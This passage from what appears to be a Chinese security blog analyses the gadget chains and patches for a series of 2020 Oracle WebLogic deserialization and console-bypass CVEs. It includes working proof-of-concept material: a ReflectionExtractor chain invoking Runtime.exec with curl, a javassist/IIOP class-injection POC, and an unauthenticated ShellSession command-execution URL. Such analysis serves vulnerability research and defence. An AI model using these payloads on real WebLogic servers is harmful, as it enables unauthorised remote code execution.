<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ReflectionExtractor extractor1 = new ReflectionExtractor(</span><br><span class="line">        &quot;getMethod&quot;,</span><br><span class="line">        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// get invoke() to execute exec()</span><br><span class="line">ReflectionExtractor extractor2 = new ReflectionExtractor(</span><br><span class="line">        &quot;invoke&quot;,</span><br><span class="line">        new Object[]&#123;null, new Object[0]&#125;</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">// invoke(&quot;exec&quot;,&quot;calc&quot;)</span><br><span class="line">ReflectionExtractor extractor3 = new ReflectionExtractor(</span><br><span class="line">        &quot;exec&quot;,</span><br><span class="line">        new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;curl http://127.0.0.1:1234/success&quot;&#125;&#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">ReflectionExtractor[] extractors = &#123;</span><br><span class="line">        extractor1,</span><br><span class="line">        extractor2,</span><br><span class="line">        extractor3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这样来到ReflectionExtractor的extract方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161355114.png" alt="image-20230516135542003"></p>
<p>找到getMethod方法，然后调用该方法，参数为getRuntime。相当于如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;)</span><br></pre></td></tr></table></figure>

<p>然后返回值为Method（代表getRuntime方法）实例。</p>
<p>第二次循环：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161401351.png" alt="image-20230516140139248"></p>
<p>这里相当于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRuntime()</span><br></pre></td></tr></table></figure>

<p>返回值为Runtime类实例。</p>
<p>第三次循环：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161438119.png" alt="image-20230516143839019"></p>
<p>反射执行exec方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;curl http://127.0.0.1:1234/success&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>连在一起就是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;).invoke().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;curl http://127.0.0.1:1234/success&quot;&#125;)</span><br></pre></td></tr></table></figure>

<p>整个流程类似CC5，且ChainedExtractor类和ChainedTransformer类的功能极其相似。</p>
<h3 id="修复-10"><a href="#修复-10" class="headerlink" title="修复"></a>修复</h3><p>CVE-2020-2555的补丁中将LimitFilter类的toString()方法中的extract()方法调用全部移除了：</p>
<blockquote>
<p>下图来自<a href="https://y4er.com/posts/weblogic-cve-2020-2555/">https://y4er.com/posts/weblogic-cve-2020-2555/</a></p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161621749.png" alt="https://y4er.com/img/uploads/20200310118799.png"></p>
<h2 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h2><h3 id="分析-26"><a href="#分析-26" class="headerlink" title="分析"></a>分析</h3><p>该漏洞是对CVE-2020-2555补丁的绕过，CVE-2020-2555补丁将LimitFilter类的toString方法中所有的extract()方法调用删除，但是却可以通过其他路径到达ChainedExtractor的extract方法。</p>
<p>网上公开的两条链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一条Gadget：</span><br><span class="line"></span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.comparator.ExtractorComparator.compare()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                .......</span><br><span class="line">                            com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br><span class="line">第二条Gadget：</span><br><span class="line"></span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                siftDownUsingComparator()</span><br><span class="line">                    com.tangosol.util.extractor.AbstractExtractor.compare()</span><br><span class="line">                      com.tangosol.util.extractor.MultiExtractor.extract()</span><br><span class="line">                        com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                            com.tangosol.util.extractor.ChainedExtractor.extract()</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    .......</span><br><span class="line">                                com.tangosol.util.extractor.ReflectionExtractor().extract()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>两条链都借助PriorityQueue作为入口点，分别触发ExtractorComparator和AbstractExtractor的compare方法。</p>
<p>我们先看ExtractorComparator，它的compare方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161631479.png" alt="image-20230516163149417"></p>
<p>这个简单，直接将m_extractor属性的值赋成ChainedExtractor即可。</p>
<p>再看看AbstractExtractor的compare方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161633598.png" alt="image-20230516163329518"></p>
<p>调用子类MultiExtractor的extract方法（如下）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161634161.png" alt="image-20230516163438080"></p>
<p>获取属性m_aExtractor的值，然后循环调用里面每个元素的extract方法。这个只需要给予一个ChainedExtractor实例，也能到达后续的路径。</p>
<p>除了使用ReflectionExtractor执行方法，还可以使用MvelExtractor执行表达式。</p>
<p>MvelExtractor的extract方法如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161647532.png" alt="image-20230516164747458"></p>
<p>获取m_oExpr属性的值，然后调用executeExpression执行表达式。表达式可以是执行命令，写文件等操作，比ReflectionExtractor构造更方便，只需要将触发MvelExtractor的extract方法即可，也不用使用ChainedExtractor包装。</p>
<h3 id="修复-11"><a href="#修复-11" class="headerlink" title="修复"></a>修复</h3><p>CVE-2020-2883的补丁将MvelExtractor和ReflectionExtractor列入黑名单。</p>
<h2 id="CVE-2020-2963"><a href="#CVE-2020-2963" class="headerlink" title="CVE-2020-2963"></a>CVE-2020-2963</h2><h3 id="分析-27"><a href="#分析-27" class="headerlink" title="分析"></a>分析</h3><p>使用SOAPInvokeState类进行反序列化，由于该类不在黑名单，所以不会拦截。</p>
<p>然后进入该类的readExternal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305161659356.png" alt="image-20230516165930280"></p>
<p>定义了一个原始的对象输入流，然后从该输入流中读取对象。原始的ObjectInputStream未作任何过滤，可以反序列化任何类，这就绕过了黑名单的限制。</p>
<h2 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h2><h3 id="分析-28"><a href="#分析-28" class="headerlink" title="分析"></a>分析</h3><p>该漏洞影响版本为 <code>12.2.1.3.0、12.2.1.4.0, 14.1.1.0.0</code> 。所以说又要重新搞一个12.2.1.3.0版本的WebLogic了。这里能直接RCE，漏洞的入口点在RemoteConstructor的readResolve方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162057765.png" alt="image-20230516205722520"></p>
<p>进入newInstance方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162058728.png" alt="image-20230516205834863"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162100644.png" alt="image-20230516210024539"></p>
<p>this.getClassLoader获取类加载器，然后调用get方法，get方法体里将获取的类加载器放入s_mapByClassLoader属性中。该属性为Map类型，相当于缓存的作用。</p>
<p>然后调用realize方法，将this指针传入。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162105801.png" alt="image-20230516210556731"></p>
<p>首先constructor.getDefinition()就是获取RemoteConstructor的m_definition属性（ClassDefinition类实例）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162107897.png" alt="image-20230516210703838"></p>
<p>然后registerIfAbsent方法将RemoteConstructor的m_definition属性（ClassDefinition类实例）放入RemotableSupport的缓存f_mapDefinitions属性中，并将ClassDefinition返回：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162108970.png" alt="image-20230516210844900"></p>
<p>然后调用definition.getRemotableClass();（如下）方法获取ClassDefinition的m_clz属性：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162112554.png" alt="image-20230516211224474"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162111875.png" alt="image-20230516211023294"></p>
<p>进入if语句后再调用一次definition.getRemotableClass();（如下）获取到的仍为null，此时再进入第二层if，调用defineClass方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162113386.png" alt="image-20230516211342300"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162116733.png" alt="image-20230516211657635"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162136509.png" alt="image-20230516213659430"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162121209.png" alt="image-20230516212019758"></p>
<p>获取definition的全类名，将&#x2F;替换成.，然后获取definition的m_abClass属性的值，它是字节数组，最后调用defineClass方法。</p>
<p>由于RemotableSupport继承ClassLoader，且没有重写带有四个参数的defineClass方法，所以由父类ClassLoader的defineClass方法来将字节数组转成Class类，并返回。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162136913.png" alt="image-20230516213607815"></p>
<p>然后调用setRemotableClass方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162129686.png" alt="image-20230516212907619"></p>
<p>该方法将参数Class赋值给definition的m_clz属性，且该Class只有一个构造器，找到这个构造器然后赋值给definition的m_mhCtor属性。</p>
<p>然后是realize方法的下半部分：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162132733.png" alt="image-20230516213228662"></p>
<p>调用ClassDefinition的createInstance方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162133882.png" alt="image-20230516213321782"></p>
<p>获取无参构造函数并执行。</p>
<p>所以重点在ClassDefinition类中。</p>
<p>我们只需要自定义ClassDefinition类，然后设置它的属性m_abClass为恶意类的字节数组，同时保证该恶意类只有一个构造函数，那么我们就可以在该构造函数中执行一些恶意操作。后面当实例化该恶意类时，就会触发恶意操作了。</p>
<p>同时还有一个细节在RemotableSupport的defineClass方法中（如下），就是要确保字节数组abClass中包含的类名和sClassName相同，不然会抛NoClassDefFoundError错误。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162116733.png" alt="image-20230516211657635"></p>
<p>这里sClassName为：包名+类名+$+version。例如：org.EvilObj$67390FCFBBD7BF8BFE3CDBB40211C00B。</p>
<p>sClassName通过如下两个操作获得：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162149042.png" alt="image-20230516214909977"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162149749.png" alt="image-20230516214928667"></p>
<p>getId返回的是m_id属性，也就是ClassIdentity类实例，然后调用该类实例的getName方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162150144.png" alt="image-20230516215056083"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162152924.png" alt="image-20230516215225867"></p>
<p>getPackage是获取包名，getSimpleName等于类名+$+m_sVersion属性。</p>
<p>所以getName返回包名+类名+$+m_sVersion属性。</p>
<p>这个m_sVersion属性表示类文件的内容 <code>MD5</code> 值，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassIdentity classIdentity = new ClassIdentity(EvilObj.class);</span><br></pre></td></tr></table></figure>

<p>classIdentity的m_sVersion属性值是自动生成的，为EvilObj.class文件的内容MD5值。</p>
<p>回到这里：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305162116733.png" alt="image-20230516211657635"></p>
<p>可以使用javassist或者ASM等字节码修改工具，将abClass字节数组里的类名改成包名+类名+$+m_sVersion属性这种类型。</p>
<p>最后的POC如下（来自<a href="https://www.anquanke.com/post/id/213074#h2-0">Sp4rr0vv</a>）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ClassIdentity</span> <span class="variable">classIdentity</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassIdentity</span>( EvilObj.class);</span><br><span class="line"><span class="type">ClassPool</span> <span class="variable">cp</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> cp.get(EvilObj.class.getName());</span><br><span class="line">ctClass.replaceClassName(EvilObj.class.getName(),  EvilObj.class.getName() + <span class="string">&quot;$&quot;</span> + classIdentity.getVersion());</span><br><span class="line"><span class="type">RemoteConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteConstructor</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassDefinition</span>(classIdentity, ctClass.toBytecode()),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;&#125;</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 发送 IIOP 协议数据包</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> getContext(<span class="string">&quot;iiop://ip:port&quot;</span>);</span><br><span class="line">context.rebind(<span class="string">&quot;hello&quot;</span>,constructor);</span><br></pre></td></tr></table></figure>

<p>整个流程为：</p>
<p>获取RemoteConstructor的m_definition属性（ClassDefinition），再获取ClassDefinition的m_abClass字节数组，转换成类，找到类中的构造函数，再赋值给ClassDefinition的m_mhCtor属性，最后获取该属性，执行该构造函数，触发恶意操作。</p>
<h2 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h2><h3 id="分析-29"><a href="#分析-29" class="headerlink" title="分析"></a>分析</h3><p>这个与CVE-2020-2883相似，调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line"> PriorityQueue.heapify()</span><br><span class="line">  PriorityQueue.siftDown()</span><br><span class="line">   siftDownUsingComparator()</span><br><span class="line">    ExtractorComparator.compare()</span><br><span class="line">     UniversalExtractor.extract() </span><br><span class="line">      UniversalExtractor.extractComplex() </span><br><span class="line">       Method.invoke()</span><br><span class="line">        JdbcRowSetImpl.getDatabaseMetaData()</span><br></pre></td></tr></table></figure>

<p>在CVE-2020-2883，是通过ExtractorComparator的compare方法触发ChainedExtractor的extract方法。</p>
<p>而CVE-2020-14645通过ExtractorComparator的compare方法触发UniversalExtractor的extract方法，UniversalExtractor是一个全新的类，之前从未使用过，它是 Weblogic 12.2.1.4.0 Coherence 组件特有的类，只适用于12.2.1.4.0版本的WebLogic。</p>
<p>在UniversalExtractor的writeExternal中（如下），可以看出反序列化可控的字段有三个m_sName、m_aoParam、m_nTarget：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171120316.png" alt="image-20230517112046189"></p>
<p>现在来看看UniversalExtractor的extract方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171102827.png"></p>
<p>m_cacheTarget在类实例化时默认为false，所以进入else，调用extractComplex方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171124937.png" alt="image-20230517112437652"></p>
<p>m_fMethod是个boolean类型，由于不可控在类实例化时默认为false，所以进入if循环，然后sCName是通过getCanonicalName方法得到，该方法体如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171127567.png" alt="image-20230517112737339"></p>
<p>通过getValueExtractorCanonicalName调用返回null，进入if语句，调用computeValueExtractorCanonicalName方法，传递属性m_sName和m_aoParam，computeValueExtractorCanonicalName方法体如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171140056.png" alt="image-20230517114058828"></p>
<p>首先是判断sName为方法名（方法名末尾带有括号），然后判断方法名是否以get或is开头，是的话就从方法名中获取字段名。举个例子：getDatabaseMetaData()会处理成databaseMetaData并返回。</p>
<p>接着在extractComplex方法中进入if语句：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171145631.png" alt="image-20230517114505353"></p>
<p>在if语句中，又将databaseMetaData首字母大写，即DatabaseMetaData，然后获取BEAN_ACCESSOR_PREFIXES属性的长度进行遍历，这里BEAN_ACCESSOR_PREFIXES属性的值为：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171148908.png" alt="image-20230517114851764"></p>
<p>其实就是个字符串数组，数组存着get和is字符串。</p>
<p>然后又将BEAN_ACCESSOR_PREFIXES的每一个元素与DatabaseMetaData字符串拼接，得到getDatabaseMetaData或isDatabaseMetaData字符串，然后将这两个拼接后的字符串作为实参，寻找这两个方法。最后成功找到了getDatabaseMetaData方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171153149.png" alt="image-20230517115319896"></p>
<p>然后反射调用该方法。后续就跳到getDatabaseMetaData中进行JNDI注入了。</p>
<h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><h3 id="分析-30"><a href="#分析-30" class="headerlink" title="分析"></a>分析</h3><p>该漏洞为Weblogic Console 后台登录绕过漏洞。正常需要认证才能访问&#x2F;console&#x2F;console.portal，而通过&#x2F;console&#x2F;images&#x2F;%252e%252e&#x2F;console.portal无需认证即可访问到&#x2F;console&#x2F;console.portal，首先因为二级路径&#x2F;images不需要认证，然后后端对%252e%252e二次解码后为..，导致最后的URI为&#x2F;console&#x2F;images&#x2F;..&#x2F;console.portal，再进行路径标准化，就变成&#x2F;console&#x2F;console.portal，最后再寻找处理该路径的Servlet，这样就造成未授权访问了。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305291700149.png" alt="image-20230529170043929"></p>
<p>在getRequestPattern进行URL第一次解码，在getTree进行URL第二次解码。</p>
<h3 id="修复-12"><a href="#修复-12" class="headerlink" title="修复"></a>修复</h3><p>在MBeanUtilsInitSingleFileServlet类中，对URI进行黑名单过滤：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305231437682.png" alt="FjcircJFs9NTj0cZKpXdH2e1FyJ"></p>
<p>当访问不需要认证的&#x2F;images时，若检测到子路径包括<code>;</code>、<code>%252E%252E</code>、<code>..</code>、<code>%3C</code>、<code>%3E</code>、<code>&lt;</code>、<code>&gt;</code>就返回404。</p>
<h2 id="CVE-2020-14756"><a href="#CVE-2020-14756" class="headerlink" title="CVE-2020-14756"></a>CVE-2020-14756</h2><h3 id="分析-31"><a href="#分析-31" class="headerlink" title="分析"></a>分析</h3><p>利用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AttributeHolder.readExternal()</span><br><span class="line">  ExternalizableHelper.readObject()</span><br><span class="line">    ExternalizableHelper.readObjectInternal()</span><br><span class="line">      ExternalizableHelper.readExternalizableLite()</span><br><span class="line">        PartialResult.readExternal()</span><br><span class="line">          PartialResult.add()</span><br><span class="line">            SortedBag.add()</span><br><span class="line">              TreeMap.put()</span><br><span class="line">                TreeMap.compare()</span><br><span class="line">                  AbstractExtractor.compare()</span><br><span class="line">               	    MvelExtractor.extract()</span><br><span class="line">                      MVEL.executeExpression()</span><br></pre></td></tr></table></figure>

<p>反序列的类为AttributeHolder，它的readExternal如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181253335.png" alt="image-20230518125325015"></p>
<p>借助ExternalizableHelper进行反序列化，ExternalizableHelper没有黑名单过滤，所以可以在此处反序列化任何类。这里选择反序列化PartialResult类，然后来到PartialResult的readExternal方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181355972.png" alt="image-20230518135555858"></p>
<p>然后再次借助ExternalizableHelper进行反序列化，ExternalizableHelper没有黑名单过滤。反序列化的类应该是个Comparator接口的实现类。</p>
<p>在CVE-2020-2883中，使用AbstractExtractor的compare方法触发子类的extract方法。这次使用的子类为MvelExtractor，它的extract可以执行表达式。</p>
<p>在上图中，将readObject读取到的对象赋给m_comparator属性，但是并没有触发compare方法。所以接着往下看，读取一个int，然后调用instantiateInternalMap方法，传递m_comparator属性：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181402599.png" alt="image-20230518140233533"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181405545.png" alt="image-20230518140548480"></p>
<p>包装成TreeMap返回，赋值给m_map属性，接着调用readObject读取对象，然后调用add方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181408429.png" alt="image-20230518140800365"></p>
<p>接着进入super.add方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181409986.png" alt="image-20230518140902907"></p>
<p>在super.add方法中，调用getInternalMap方法获取刚刚包装的TreeMap，然后调用该TreeMap的put方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181411132.png" alt="image-20230518141153065"></p>
<p>put方法里，调用了compare方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181412621.png" alt="image-20230518141254526"></p>
<p>compare方法里，调用comparator属性的compare方法，然后来到AbstractExtractor的compare方法（如下，因为MvelExtractor未实现compare方法，所以交给父类AbstractExtractor处理）：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181417693.png" alt="image-20230518141730632"></p>
<p>中间省了一步无关紧要的，其实comparator属性的compare方法先来到WrapperComparator的compare再来到AbstractExtractor的compare方法的。这AbstractExtractor的compare方法中，调用了extract方法，来到子类MvelExtractor的extract方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305181423609.png" alt="image-20230518142352521"></p>
<p>在extract方法中，先获取编译后的表达式然后执行。</p>
<h3 id="修复-13"><a href="#修复-13" class="headerlink" title="修复"></a>修复</h3><p>首先将MvelExtractor加入黑名单，然后在ExternalizableHelper.readExternalizableLite()中判断输入流是否为对象输入流实例，是的话则校验类是否在黑名单，在的话抛出异常。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305301710157.png" alt="image-20230530171000935"></p>
<h2 id="CVE-2020-14825-x2F-CVE-2020-14841"><a href="#CVE-2020-14825-x2F-CVE-2020-14841" class="headerlink" title="CVE-2020-14825&#x2F;CVE-2020-14841"></a>CVE-2020-14825&#x2F;CVE-2020-14841</h2><h3 id="分析-32"><a href="#分析-32" class="headerlink" title="分析"></a>分析</h3><p>网上搜到的CVE-2020-14825和CVE-2020-14841都是一模一样的内容。</p>
<p>这个又与CVE-2020-14645相似，调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line"> PriorityQueue.heapify()</span><br><span class="line">  PriorityQueue.siftDown()</span><br><span class="line">   siftDownUsingComparator()</span><br><span class="line">    ExtractorComparator.compare()</span><br><span class="line">     LockVersionExtractor.extract() </span><br><span class="line">	  MethodAttributeAccessor.getAttributeValueFromObject()</span><br><span class="line">       Method.invoke()</span><br><span class="line">        JdbcRowSetImpl.getDatabaseMetaData()</span><br></pre></td></tr></table></figure>

<p>在CVE-2020-14645，是通过UniversalExtractor的extract方法触发后续JNDI注入的。</p>
<p>而在CVE-2020-14825&#x2F;CVE-2020-14841，通过LockVersionExtractor的extract方法触发后续JNDI注入。</p>
<p>所以先来看看LockVersionExtractor的extract方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171609226.png" alt="image-20230517160950157"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171611964.png" alt="image-20230517161112812"></p>
<p>这个accessor为MethodAttributeAccessor类实例。调用MethodAttributeAccessor类实例的isInitialized方法判断setMethod属性和getMethod属性是否同时都有值。如果这个MethodAttributeAccessor类实例的setMethod和getMethod只要有一个为null，就是没被初始化，就会进入if语句，调用MethodAttributeAccessor类实例的initializeAttributes方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171613400.png" alt="image-20230517161319279"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171621442.png" alt="image-20230517162101347"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171621614.png" alt="image-20230517162113528"></p>
<p>在initializeAttributes方法中，通过getMethodName属性和setMethodName属性所指定的方法名去寻找方法，然后将方法Method设置到MethodAttributeAccessor类实例的getMethod属性和setMethod属性。</p>
<p>接下来进入getAttributeValueFromObject方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171615982.png" alt="image-20230517161559894"></p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305171617427.png" alt="image-20230517161731330"></p>
<p>执行getter方法，执行的对象为anObject，anObject为JdbcRowSetImpl类实例。实参为parameters，parameters为null。</p>
<p>这就来到JdbcRowSetImpl.getDatabaseMetaData()，后续触发JNDI注入。</p>
<p>这里的写POC的思路是：</p>
<ol>
<li>创建一个PriorityQueue对象，存储两个对象，一个为JdbcRowSetImpl对象，另一个为LockVersionExtractor对象；</li>
<li>将LockVersionExtractor对象的属性accessor设置为MethodAttributeAccessor对象；</li>
<li>将MethodAttributeAccessor的getMethodName属性设置成getDatabaseMetaData字符串；</li>
</ol>
<p>我就懒得写了。</p>
<h2 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h2><h3 id="分析-33"><a href="#分析-33" class="headerlink" title="分析"></a>分析</h3><p>这与14750相似，14750使用&#x2F;images绕过认证，访问console.portal，而14882使用&#x2F;css绕过认证，访问console.portal，POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h2><h3 id="分析-34"><a href="#分析-34" class="headerlink" title="分析"></a>分析</h3><p>在Weblogic 12.2.1版本上有个ShellSession类，可以直接执行命令。</p>
<p>利用14882的未授权，指定handle为ShellSession，就可以直接未授权执行任意命令了。POC如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;)</span><br></pre></td></tr></table></figure>

<p>ShellSession的构造函数中带有一个字符串参数，该参数为要执行的表达式，然后调用exec执行该表达式。</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305231520902.png" alt="image-20230523152013813"></p>
<p>在整个处理流程中，BreadcrumbBacking类的init方法会对URI中的handle参数进行处理：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305231529850.png" alt="image-20230523152907725"></p>
<p>先调用findFirstHandle获取handle参数的值<code>com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/fuck&#39;);&quot;)</code>，然后调用getHandle方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202305231536450.png" alt="image-20230523153626358"></p>
<p>这里先将字符串<code>com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/fuck&#39;);&quot;)</code>分割成两部分，第一部分为<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，作为className；第二部分为<code>java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/fuck&#39;);</code>，作为objectIdentifier。然后是注册ShellSession类，执行该类的构造函数，传递实参<code>java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/fuck&#39;);</code>。</p>
